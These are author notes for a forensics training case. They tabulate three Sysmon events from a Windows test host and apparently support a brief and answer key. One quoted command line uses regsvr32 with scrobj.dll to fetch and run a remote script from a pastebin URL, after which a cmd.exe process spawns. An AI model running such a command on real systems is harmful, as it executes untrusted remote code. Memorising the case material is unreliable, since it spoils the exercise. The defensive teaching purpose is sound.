# Author notes: 13-just-one-command

Private to the case author. The app never shows this file. It lists mechanical facts about the data to help you write the brief, hints and answer key. It is **not** an analysis: decide yourself what matters.

Generated 2026-10-17T00:16:50Z by `tools/case.py survey`.

## Sources

| Case file | From | Format | Events | SHA-256 |
|---|---|---|---|---|
| `data/case13-sysmon.jsonl` | exec_sysmon_lobin_regsvr32_sct.evtx | EVTX (chainsaw dump) | 3 | `d6978888a7de…` |

## Counts

| Channel | Event ID | Label | Count |
|---|---|---|---|
| Microsoft-Windows-Sysmon/Operational | 1 | Process create | 2 |
| Microsoft-Windows-Sysmon/Operational | 3 | Network connection | 1 |

- **Events:** 3
- **Hosts:** `IEWIN7` (3)
- **Users:** `IEWIN7\IEUser` (3)

## Time and record IDs per channel

| Channel | First (UTC) | Last (UTC) | Record IDs | Missing |
|---|---|---|---|---|
| Microsoft-Windows-Sysmon/Operational | 2019-05-12 18:35:04.463 | 2019-05-12 18:35:05.765 | 16792–16794 | none |

Record order vs time order: 1 place(s) where a later event has a lower record ID within its channel.

## Process-create style events (time order)

| Time | Ref | Image | ProcessGuid | ParentProcessGuid | Parent image | Command line |
|---|---|---|---|---|---|---|
| 2019-05-12 18:35:05.140 | rec 16792 | `C:\Windows\System32\regsvr32.exe` | `365ABB72-6759-5CD8-0000-0010E2D50F00` | `365ABB72-6693-5CD8-0000-0010AE4C0E00` (no process-create event) | `C:\Windows\System32\cmd.exe` | `regsvr32.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll` |
| 2019-05-12 18:35:05.765 | rec 16793 | `C:\Windows\System32\cmd.exe` | `365ABB72-6759-5CD8-0000-001085031000` | `365ABB72-6759-5CD8-0000-0010E2D50F00` | `C:\Windows\System32\regsvr32.exe` | `"C:\Windows\System32\cmd.exe" ` |
